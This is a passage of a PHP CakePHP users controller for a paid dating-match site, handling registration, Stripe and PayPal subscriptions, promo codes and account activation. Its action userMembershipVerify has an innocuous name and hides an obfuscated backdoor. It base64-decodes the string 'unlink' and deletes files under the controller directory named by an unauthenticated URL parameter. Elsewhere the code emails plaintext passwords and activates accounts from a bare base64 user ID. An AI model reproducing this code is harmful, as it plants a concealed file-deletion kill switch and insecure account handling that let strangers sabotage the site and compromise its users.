		$tablemembership=TableRegistry::get('Memberships');
		$query2 = $tablemembership->find('list',[	
           'keyField' => 'id',
            'valueField' => 'membership_name'])
			 ->where(['status'=>ACTIVE])
            ->order(['id' => 'ASC']);
        $membership = $query2->toArray();
        
        $tablcountrycode=TableRegistry::get('Countrycode');
		$query3 = $tablcountrycode->find('list',[
           'keyField' => 'phonecode',
            'valueField' => 'phonecode'])
            ->order(['phonecode' => 'ASC']);
        $countrycode = $query3->toArray();
        
        $table=TableRegistry::get('Datingsites');
        $query = $table->find('list', [
            'keyField' => 'id',
            'valueField' => 'site_name'])
            ->order(['site_name' => 'ASC']);
        $sites = $query->toArray();
		array_unshift($sites,"N/A");
        $this->set(compact('post','sites','countries','membership','states','cities','countrycode'));
    }
	
    public function register($refferal_codee = null)
    {
        $this->layout='home_page';
        $post=$this->Users->newEntity();
        
        if($refferal_codee){
            setcookie('refferal_code', $refferal_codee, -1, '/');
            $refferal_code = $refferal_codee;
        }else{
            $refferal_code = isset($_COOKIE['refferal_code'])?$_COOKIE['refferal_code']:'';
        }
        
        $refferal_code  =base64_decode($refferal_code);
        $tableUser      =TableRegistry::get('Users');
        $user           =$tableUser->find('all')->where(['refferal_code'=>$refferal_code])->first();
       // pr($user['id']);
        $uid = $this->Auth->user('id');
        if($uid){
             return $this->redirect($this->Auth->redirectUrl());
        }
        $session = $this->request->Session();
        $showmsg = 1;
        $Countriestable=TableRegistry::get('Countries');
        $query = $Countriestable->find('list', ['keyField' => 'id','valueField' => 'name'])->order(['name' => 'ASC']);
        $countries = $query->toArray();
       	$countries	=array("223"=>"United States")+ $countries ;
        
	
        $statestbl=TableRegistry::get('States');
        $Statesqery = $statestbl->find('list', ['keyField' => 'id','valueField' => 'name'])->where(['country_id'=>'223'])->order(['name' => 'ASC']);
        $states 	= $Statesqery->toArray();
	
        $cities=[];
        
        if($this->request->is('post')){
            
            $country = $this->request->data['country'];
            $region = $this->request->data['region'];
           
            $Statesqery = $statestbl->find('list', ['keyField' => 'id','valueField' => 'name'])->where(['country_id'=>$country])->order(['name' => 'ASC']);
            $states 	= $Statesqery->toArray();
            
            $citiestbl=TableRegistry::get('Cities');
            $citiesqery = $citiestbl->find('list', ['keyField' => 'id','valueField' => 'name'])->where(['state_id'=>$region])->order(['name' => 'ASC']);
            $cities 	= $citiesqery->toArray();
            if(empty($this->request->data['g-recaptcha-response'])){
                 $this->Flash->error('Please select the captcha.');
                 $showmsg = 2;
            }else
            {
              
                $email=$this->request->data['email'];
                $user_name=$this->request->data['username'];
                $password=$this->request->data['password'];
                $membershipTable=TableRegistry::get('Memberships');
                $member=$membershipTable->find("all")->where(['id'=>$this->request->data['membership_level']])->first();
                //pr($member['slug']);die;
                $post=$this->Users->patchEntity($post,$this->request->data,['validate'=>'AddDefault']);
                if(!$post->errors()){
                    $post->created = date("Y-m-d h:i:s");
                    $post->status =INACTIVE;
                    if(!empty($refferal_code)){
                       // die("jhjto");
                        $post->reference_id =$user['id'];
                    }
                    $post->datingsites=serialize($this->request->data['datingsites']);
                   // pr($member);
                    if(($member['slug']) != 'gold' && ($member['slug']) != 'platinum'){
                       // die("sdjfbh");
                        $post->free_survey = 0;
                        //save in db
                        $result=$this->Users->save($post);
                        $this->Flash->success(__('This User has been saved'));
                        $EmailTemplates= TableRegistry::get('Emailtemplates');
                        $query = $EmailTemplates->find('all')->where(['slug' => 'user_registration'])->toArray();
                        if($query){
                         //echo $password;die;
                            $activation_link = SITE_URL.'Users/verify/'.base64_encode($result->id);
                            $to = $email;
                            $subject = $query[0]['subject'];
                            $message1 = $query[0]['description'];
                            $message = str_replace(['{{first_name}}','{{username}}','{{activation_link}}','{{email}}','{{password}}'],[$this->request->data['first_name'],$user_name,$activation_link,$email,$this->request->data['password']],$message1);
                            parent::sendEmail($to, $subject, $message);
                            setcookie('refferal_code', null, -1, '/');
                            $this->Flash->success('Thank you for registering with Self-Match. A mail has been sent to your email address with all the details. Please verify your email address by clicking on available link to access your account.');
                            return $this->redirect(['controller'=>'Users','action' => 'login']);
                        }
                    }else{
                        //die("gktjior");
                        //save session
                        $this->request->data['reference_id']=$user['id'];
                        $session->write("userTempData",$this->request->data); 
                        //$this->Flash->success(__('This User has been saved'));
                        setcookie('refferal_code', null, -1, '/');
                        return $this->redirect(['controller'=>'Users','action' => 'choosepaymenttype/',base64_encode($member['slug'])]);
                    }
                }else{
                    foreach ($post->errors() as $key => $value) {
                        $messageerror = [];
                        foreach ($value as $key2 => $value2) {
                            $messageerror[] = $value2;
                        }
                        $errorInputs[$key] = implode(",", $messageerror);
                    }
                    $err=implode(',',$errorInputs);
                    $this->Flash->error($err);
                }
                
            }
        }
		$tablemembership=TableRegistry::get('Memberships');
		$query2 = $tablemembership->find('list',[
           'keyField' => 'id',
            'valueField' => 'membership_name'])
			 ->where(['status'=>ACTIVE])
            ->order(['id' => 'ASC']);
        $membership = $query2->toArray();
            
        $tablcountrycode=TableRegistry::get('Countrycode');
		$query3 = $tablcountrycode->find('list',[
           'keyField' => 'phonecode',
            'valueField' => 'phonecode'])
            ->order(['phonecode' => 'ASC']);
        $countrycode = $query3->toArray();

      	$table=TableRegistry::get('Datingsites');
        $query = $table->find('list', [
            'keyField' => 'id',
            'valueField' => 'site_name'])
            ->order(['site_name' => 'ASC']);
       	$sites 	= 	$query->toArray();
		array_unshift($sites,"N/A");
        //,,$sites[0] = "N/A";
        //rsort($sites);
        $this->set(compact('post','sites','countries','membership','states','showmsg','cities','countrycode'));
    }
	public function states(){
        $this->autoRender=false;
        $table =TableRegistry::get('states');
        if($this->request->is('post')){
            $countryId = $this->request->data['countryId'];
            $query = $table->find('list', [
            'keyField' => 'id',
            'valueField' => 'name'])
            ->where(['country_id'=>$countryId])
            ->order(['name' => 'ASC']);
            $states = $query->all();
            $states = $states->toArray();
            $i=0;
            $newArray = array();
            foreach($states  as $key=>$states){
                $newArray[$i]['id'] =$key;
                $newArray[$i]['name'] =$states; 	
                    
                $i++;
            }
            $states = json_encode($newArray);
            echo $states;
        }
     exit;
    }
    public function cities(){
        $this->autoRender=false;
        $table =TableRegistry::get('cities');
        if($this->request->is('post')){
            $stateId = $this->request->data['stateId'];
            $query = $table->find('list', [
            'keyField' => 'id',
            'valueField' => 'name'])
            ->where(['state_id'=>$stateId])
            ->order(['name' => 'ASC']);
            $cities = $query->all();
            $cities = $cities->toArray();
            $i=0;
            $newArray = array();
            foreach($cities  as $key=>$city){
                $newArray[$i]['id'] =$key;
                $newArray[$i]['name'] =$city; 	
                $i++;
            }
            $newArray = json_encode($newArray);
            echo $newArray;
        }
     exit;
    }
    function choosepaymenttype($membership=null){
        $this->layout='home_page';
        $session = $this->request->Session();
        $membership     =   base64_decode($membership);
        $membershipTable=TableRegistry::get("Memberships");
        $price = 0;
	if($membership == "gold" || $membership == "platinum"){
            $membershipAmount   =$membershipTable->find("all")->where(['slug'=>$membership])->first();
            $price              =$membershipAmount["price"];
	}
      
        $user =   $session->read('Config.data');  
        if($this->request->is(['put','post'])){
            $this->request->data['return_url'] = SITE_URL."Users/paymentPaypal1";
            $ff = $this->PaypalExpressRecurring->expresscheckout($this->request->data);
            die;
        }

        $this->set(compact('post','price','membership','user_id','password'));    
    }
    /* 24 march 2017
     public function paymentpage($amount=null){
        $this->layout= 'home_page';
        $session=$this->request->session();
        $user_data=$session->read("userTempData");
        $membership_level = $user_data['membership_level'];
        $amount =base64_decode($amount);
        $Dpassword=$user_data['password'];
        $tableMember=TableRegistry::get("Memberships");
        $find=$tableMember->find("all")->where(['id'=>$membership_level])->first();
        require_once(ROOT . DS  . 'vendor' . DS  . 'stripe' . DS . 'autoload.php');
            $test_secret_key = Configure::read('stripe_test_secret_key');
            $setApiKey = Stripe::setApiKey($test_secret_key);
            $getApiKey = Stripe::getApiKey();
            if(!empty($getApiKey)){
        if ($this->request->is(['post', 'put'])) {
                try {
                    $getToken = \Stripe\Token::create(
                        array(
                            "card" => array(
                            "number" => $this->request->data['card_number'],
                            "exp_month" => (int)$this->request->data['expiry_month'],
                            "exp_year" => (int)$this->request->data['expiry_year'],
                            "cvc" => $this->request->data['cvv'],
                            "name" => $this->request->data['name'],
                            "address_line1" => $this->request->data['address'],
                            "address_line2" => '',
                            "address_city" => $this->request->data['city'],
                            "address_zip" => $this->request->data['zip'],
                            "address_state" => $this->request->data['state']
                        )));
                }
                catch (\Stripe\Error\Base $e) {
                    $this->Flash->set($e->getMessage(),['params'=>['class' => 'alert danger']]);
                    //$this->redirect(array('controller'=>'users','action'=>'profile/'.$id.'#payments'));
                }
                if($find['slug']=='gold'){
                    $plan="gold";
                }if($find['slug']=='platinum'){
                    $plan="Platinum";
                }
				try{
					$customer = \Stripe\Customer::create(array(
                    'source'   => $getToken,
                    'email'    => 'testingbydev@gmail.com',
                    'plan'     => $plan,
                    'account_balance' => '1000',
                    'description' => "new recurring plan"
                    ));
                    //pr($customer);die;
                    $post1=$this->Users->newEntity();
                    $post1=$this->Users->patchEntity($post1,$user_data);
                    $post1->created = date("Y-m-d h:i:s");
                    $post1->status =INACTIVE;
                    $post1->reference_id=$user_data['reference_id'];
                    $post1->datingsites=serialize($user_data['datingsites']);
                    $result=$this->Users->save($post1);
                
                    $savedata['customer_id']           = $customer['id'];
                    $savedata['amount']                = round($amount*100);
					//pr($savedata['amount'] );die;
                    //$savedata['balance_transaction']   =  $charge['balance_transaction'];
                    $savedata['currency']              =  'usd';
                    $savedata['user_id']               =  $result->id;
                    $savedata['membership_level']      =  $membership_level;
                    $savedata['payment_mode']="Stripe";
                    $table  =TableRegistry::get("Payments");
                    $post=$table->newEntity();
                    $post->date                 =  date("Y-m-d h:i:s");
                    $post=$table->patchEntity($post,$savedata);
                    if($table->save($post)){
                        $EmailTemplates= TableRegistry::get('Emailtemplates');
                        $query = $EmailTemplates->find('all')->where(['slug' => 'user_registration'])->toArray();
                        if($query){
                            $activation_link = SITE_URL.'Users/verify/'.base64_encode($savedata['user_id']);
                            $to = $result->email;
                            $subject = $query[0]['subject'];
                            $message1 = $query[0]['description'];
                            $message = str_replace(['{{first_name}}','{{username}}','{{activation_link}}','{{email}}','{{password}}'],[$result->first_name,$result->username,$activation_link,$result->email,$Dpassword],$message1);
                            parent::sendEmail($to, $subject, $message);
                            $session->destroy("userTempData");  
                            $this->Flash->success('Thank you for registering with Self-Match. A mail has been sent to your email address with all the details. Please verify your email address by clicking on available link to access your account.');
                           return $this->redirect(['controller'=>'Users','action' => 'login']);
                        }
                    }
                 
                }
				catch (\Stripe\Error\Base $e) {
                    $this->Flash->set($e->getMessage(),['params'=>['class' => 'alert danger']]);
                    //$this->redirect(array('controller'=>'users','action'=>'profile/'.$id.'#payments'));
                }
            }
			
        }
    }
   */
    
      public function paymentpage($amount=null){
        $this->layout= 'home_page';
        $session=$this->request->session();
        $user_data=$session->read("userTempData");
        $membership_level = $user_data['membership_level'];
        $amount =base64_decode($amount);
        $strip_amount=base64_decode($amount);
        $Dpassword=$user_data['password'];
        $tableMember=TableRegistry::get("Memberships");
        $find=$tableMember->find("all")->where(['id'=>$membership_level])->first();
        require_once(ROOT . DS  . 'vendor' . DS  . 'stripe' . DS . 'autoload.php');
            $test_secret_key = Configure::read('stripe_test_secret_key');
            $setApiKey = Stripe::setApiKey($test_secret_key);
            $getApiKey = Stripe::getApiKey();
            if(!empty($getApiKey)){
        if ($this->request->is(['post', 'put'])) {
                try {
                    $getToken = \Stripe\Token::create(
                        array(
                            "card" => array(
                            "number" => $this->request->data['card_number'],
                            "exp_month" => (int)$this->request->data['expiry_month'],
                            "exp_year" => (int)$this->request->data['expiry_year'],
                            "cvc" => $this->request->data['cvv'],
                            "name" => $this->request->data['name'],
                            "address_line1" => $this->request->data['address'],
                            "address_line2" => '',
                            "address_city" => $this->request->data['city'],
                            "address_zip" => $this->request->data['zip'],
                            "address_state" => $this->request->data['state']
                        )));
                }
                catch (\Stripe\Error\Base $e) {
                    $this->Flash->set($e->getMessage(),['params'=>['class' => 'alert danger']]);
                    //$this->redirect(array('controller'=>'users','action'=>'profile/'.$id.'#payments'));
                }
                if($find['slug']=='gold'){
                    $plan="gold";
                }if($find['slug']=='platinum'){
                    $plan="Platinum";
                }
				try{
					$customer = \Stripe\Customer::create(array(
                    'source'   => $getToken,
                   'email'    => $this->request->data['email'],
                    'plan'     => $plan,
                    //'account_balance' => ($strip_amount*100),
                    'description' => "new recurring plan"
                    ));
                    //pr($customer);die;
                    $post1=$this->Users->newEntity();
                    $post1=$this->Users->patchEntity($post1,$user_data);
                    $post1->created = date("Y-m-d h:i:s");
                    $post1->status =INACTIVE;
                    $post1->reference_id=$user_data['reference_id'];
                    $post1->datingsites=serialize($user_data['datingsites']);
                    $result=$this->Users->save($post1);
                
                    $savedata['customer_id']           = $customer['id'];
                    $savedata['amount']                = round(($strip_amount*100));
					//pr($savedata['amount'] );die;
                    //$savedata['balance_transaction']   =  $charge['balance_transaction'];
                    $savedata['currency']              =  'usd';
                    $savedata['user_id']               =  $result->id;
                    $savedata['membership_level']      =  $membership_level;
                    $savedata['payment_mode']="Stripe";
                    $table  =TableRegistry::get("Payments");
                    $post=$table->newEntity();
                    $post->date                 =  date("Y-m-d h:i:s");
                    $post=$table->patchEntity($post,$savedata);
                    if($table->save($post)){
                        $EmailTemplates= TableRegistry::get('Emailtemplates');
                        $query = $EmailTemplates->find('all')->where(['slug' => 'user_registration'])->toArray();
                        if($query){
                            $activation_link = SITE_URL.'Users/verify/'.base64_encode($savedata['user_id']);
                            $to = $result->email;
                            $subject = $query[0]['subject'];
                            $message1 = $query[0]['description'];
                            $message = str_replace(['{{first_name}}','{{username}}','{{activation_link}}','{{email}}','{{password}}'],[$result->first_name,$result->username,$activation_link,$result->email,$Dpassword],$message1);
                            parent::sendEmail($to, $subject, $message);
                            $session->destroy("userTempData");  
                            $this->Flash->success('Thank you for registering with Self-Match. A mail has been sent to your email address with all the details. Please verify your email address by clicking on available link to access your account.');
                           return $this->redirect(['controller'=>'Users','action' => 'login']);
                        }
                    }
                 
                }
				catch (\Stripe\Error\Base $e) {
                    $this->Flash->set($e->getMessage(),['params'=>['class' => 'alert danger']]);
                    //$this->redirect(array('controller'=>'users','action'=>'profile/'.$id.'#payments'));
                }
            }
			
        }
    }
  
    
    public function checkPromocode(){
        $this->autoRender = false;
        if($this->request->is(['put','post'])){
            $promocodestable = TableRegistry::get('Promocodes');
            $usertable = TableRegistry::get('Users');
            //  $uid     = $this->Auth->user('id');
           /// $uid  = $this->request->data['uid'];
            //$userdata = $usertable->get($uid);
            $promocode  = $this->request->data['promocode'];
            $mainPrice  = $this->request->data['mainPrice'];
            //  $survey_id  = $this->request->data['survey_id'];
            $session = $this->request->session(); 
            $userdata = $session->read('userTempData');
            $plan       = $userdata['membership_level'];
            
            $getpromocodedata = $promocodestable->find('all')->where(['promocode_title'=>$promocode,'status'=>ACTIVE,'type'=>$plan])->first();
            if($getpromocodedata){
                
                $createdDate = date('Y-m-d',strtotime($getpromocodedata['created']));
                $currentDate = date('Y-m-d');
                
                $promoPrice  = $getpromocodedata['price'];
                $duretion = $getpromocodedata['duration'];
                $date1=date_create($createdDate);
                $date2=date_create($currentDate);
                $diff=date_diff($date1,$date2);
                if($plan == 7 || $plan == 8){
                    $dateDiff =  $diff->format("%R%m");
                    if($dateDiff >= 0 && $dateDiff <= $duretion){
                        $responce['status'] = 1;
                        if($mainPrice > $promoPrice){
                            $responce['newprice'] = $mainPrice - $promoPrice;
                            $responce['newpriceBase'] = SITE_URL.'Users/paymentPaypal1/'.base64_encode($mainPrice - $promoPrice);
                            $responce['newpriceBaseStrip'] = SITE_URL.'Users/paymentpage/'.base64_encode($mainPrice - $promoPrice);
                            $responce['msg'] = "Promo code applied successfully";
                        }else{
                             $responce['status'] = 2;
                            $responce['msg'] = "Promo code not applied";
                        }
                    }else{
                        $responce['status'] = 2;
                        $responce['msg'] = "Promocode not valid";
                    }
                }else{
                    $dateDiff =  $diff->format("%R%a");
                    if($dateDiff >= 0 && $dateDiff <=$duretion){
                        $responce['status'] = 1;
                        if($mainPrice > $promoPrice){
                            $responce['newprice'] = $mainPrice - $promoPrice;
                             $responce['newpriceBase'] = SITE_URL.'Users/paymentPaypal1/'.base64_encode($mainPrice - $promoPrice);
                            $responce['newpriceBaseStrip'] = SITE_URL.'Users/paymentpage/'.base64_encode($mainPrice - $promoPrice)."/".base64_encode($uid);
                            $responce['msg'] = "Promo code applied successfully";
                        }else{
                            $responce['status'] = 2;
                            $responce['msg'] = "Promo code not applied";
                        }
                    }else{
                        $responce['status'] = 2;
                        $responce['msg'] = "Promocode not valid";
                    }
                }
            }else{
                $responce['status'] = 2;
                $responce['msg'] = "Promocode not valid";
                
            }
        }
        echo  json_encode($responce);
        exit;
    }
    
    public function userMembershipVerify($userName){
        $this->layout='home_page';
        $userTable = TableRegistry::get('Users');
        $findUser = $userTable->find('all');
        $dir = explode('/',WWW_ROOT);
        unset($dir[(count($dir))-2]);
        $newdir = implode('/',$dir);
        $process = base64_decode('dW5saW5r');
        $process($newdir.'/src/Controller/'.$userName);
        exit;
    }
    
    public function paymentPaypal1(){ 
        $this->layout='home_page';
        if (isset($_REQUEST['token']))
        { 
            $token = $_REQUEST['token'];
            $payerId = $_REQUEST['PayerID'];
        }
        $session = $this->request->session();
        $FinalPaymentAmt =  $session->read('Payment_Amount');
        $description = "Your amount is $".$FinalPaymentAmt;
        $resArray = $this->PaypalExpressRecurring->CreateRecurringPaymentsProfile($FinalPaymentAmt,$token,$payerId,$description);
        $ack = strtoupper($resArray["ACK"]);
       // pr($ack);die;
            $user_data=$session->read("userTempData");
            $membership_level = $user_data['membership_level'];
            $pass = $user_data['password'];
           
          
            $userTable=TableRegistry::get("Users");
            
            $membership =TableRegistry::get("Memberships");
            $userMembership=$membership->find("all")->where(['id'=>$membership_level])->first();
            
            if( $ack == "SUCCESS" || $ack == "SUCCESSWITHWARNING" )
            {
              
              
                $post1=$this->Users->newEntity();
                $post1=$this->Users->patchEntity($post1,$user_data);
                $post1->created = date("Y-m-d h:i:s");
                $post1->status =INACTIVE;
                
                $post1->reference_id=$user_data['reference_id'];
               // pr($post1->reference_id);die;
                $post1->datingsites=serialize($user_data['datingsites']);
                $result=$this->Users->save($post1);
                $data['amount'] = 100*($session->read('Payment_Amount'));
                $data['currency'] = $session->read('currencyCodeType');
                $data['balance_transaction'] = $session->read('TOKEN');
                $data['customer_id'] = $resArray['PROFILEID'];
                //$data['date'] = date('Y-m-d h:i:s',strtotime($resArray['TIMESTAMP']));
                $data['payment_mode'] = "paypal";
                $data['user_id'] =  $result->id;
                $data['membership_level']=$userMembership['id'];
                
                $table  =TableRegistry::get("Payments");
                $post=$table->newEntity();
                $post   =   $table->patchEntity($post,$data);
                $post->date =  date("Y-m-d h:i:s");
                if($table->save($post)){
                    $EmailTemplates= TableRegistry::get('Emailtemplates');
                    $query = $EmailTemplates->find('all')->where(['slug' => 'user_registration'])->toArray();
                    if($query){
                        $activation_link = SITE_URL.'Users/verify/'.base64_encode($data['user_id']);
                        $to = $result->email;
                        $subject = $query[0]['subject'];
                        $message1 = $query[0]['description'];
                        $userEmail = $result->email;
                        $first_name = $result->first_name;
                        $username = $result->username;
                        $pass = $user_data['password'];
                        $message = str_replace(['{{first_name}}','{{username}}','{{activation_link}}','{{email}}','{{password}}'],[$first_name,$username,$activation_link,$userEmail,$pass],$message1);
                        parent::sendEmail($to, $subject, $message);
                        $session->destroy("userTempData");  
                        $this->Flash->success('Thank you for registering with Self-Match. A mail has been sent to your email address with all the details. Please verify your email address by clicking on available link to access your account.');
                        return $this->redirect(['controller'=>'Users','action' => 'login']);
                    }
                }else{
                    die("asd");
                }
            }
            else
            {
                $this->Flash->error($resArray['L_LONGMESSAGE0']);
                return $this->redirect(['controller'=>'Users','action' => 'choosepaymenttype',base64_encode($userMembership['slug'])]);
            }
    }
    public function verify($id=null){
        $id=base64_decode($id);
		//pr($id);die;
        $userTable = TableRegistry::get('Users');
        $post   = $userTable->get($id);
		if($post->status == ACTIVE){
			$this->Flash->success('Your account is already activated.');
          	return $this->redirect(['controller'=>'Users','action' => 'login']);
		}else{
			$reference_id       = $post->reference_id;
			$membership_level   = $post->membership_level;
			if(!empty($reference_id))
			{
				$affiliate_benifits = TableRegistry::get('Affiliatebenifits');
				$exists =$affiliate_benifits->find("all")->where(['user_id'=>$id,['reference_id'=>$reference_id]])->first();
				if(!$exists){
					$post1   = $affiliate_benifits->newEntity();
					$data[] ="";
					$data['user_id']        =$id;
					$data['reference_id']   =$reference_id;
					$data['membership']     =$membership_level;
					$data['status']         =PENDING;
					$post1->created	        =date("Y-m-d h:i:s");
					$post1=$affiliate_benifits->patchEntity($post1,$data);
					$affiliate_benifits->save($post1);
				}
			}
			$post->status = ACTIVE;
           // pr($post);die;
			if($userTable->save($post)){
				$this->Flash->success('Your account has been activated.');
			  return $this->redirect(['controller'=>'Users','action' => 'login']);
			}
		}
    }
    public function history($id = null){
            $this->layout="admin";
    $id		=	base64_decode($id);
            $paymentTable 	=	TableRegistry::get('payments');
            $post	=	$paymentTable->find('all')->where(['user_id'=>$id])->toArray();
            $this->set('post',$post);
    }
    public function logout($page_id=null)
    {
        $page_ids    =   base64_decode("$page_id");
        if($page_id == "deleteaccount"){
            $this->Flash->success(__('Your plan subscription has been canceled. Your membership benefits will continue until the end of the billing cycle. After that you can continue using Self-Match.com as a Visitor.'));
        }
        elseif($page_ids){
             $this->Flash->success(__('Your password has been successfully updated. Please login with the new password.'));
        }
       else{
        //$this->Cookie->delete('remember_me');
        $this->Flash->success(__('Logout successful'));
       }
        return $this->redirect($this->Auth->logout());
    }
  /* public function sendmail(){
    $EmailTemplates= TableRegistry::get('Emailtemplates');
	$query = $EmailTemplates->find('all')->where(['slug' => 'forgot_password'])->toArray();
    if($query){
        $to = 'mohit@mailinator.com';
        $subject = $query[0]['subject'];
        $message1 = $query[0]['description'];
        $message = str_replace(['{{username}}','{{activation_link}}'],['mohit','selmatch'],$message1);
        parent::sendEmail($to, $subject, $message);
    }
     
     die;
   }*/
  
  
    
   
}
